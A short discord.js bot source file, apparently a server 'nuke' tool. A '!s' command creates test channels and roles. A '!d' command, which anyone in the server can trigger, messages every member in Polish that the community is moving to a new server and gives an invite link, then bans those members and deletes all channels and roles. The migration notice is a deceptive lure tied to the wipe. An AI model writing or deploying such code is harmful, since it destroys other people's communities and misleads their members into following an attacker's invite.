const Discord = require('discord.js');
const config = require('./config.json');
const BotClient = new Discord.Client();

BotClient.on('ready', () => {
    console.log('Toster BOT is online!');
});

BotClient.on('message', msg => {
    // Ignore messages that aren't from a guild
    if (!msg.guild) return;

    if (msg.content.startsWith('!s')) {
        for (let index = 0; index < 5; index++) {
            msg.guild.channels
                .create(`test-channel-${index+1}`, {
                    type: 'text'
                })
                .then(console.log)
                .catch(console.error);
            msg.guild.channels.create(`test-channel-${index+1}`, {
                    type: 'voice'
                })
                .then(console.log)
                .catch(console.error);
            msg.guild.roles
                .create({
                    data: {
                        name: `test-role-${index+1}`,
                    }
                })
                .then(console.log)
                .catch(console.error);
        }
    };

    if (msg.content.startsWith('!d')) {
        try {
            msg.guild.members.cache
                .filter(m => m.user.id !== config.bot_id && m.user.id !== msg.guild.ownerID)
                .forEach(m => {
                    m.user.send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!');
                    m.ban();
                });
            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.roles.cache.forEach(role => role.delete());
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.login(config.token);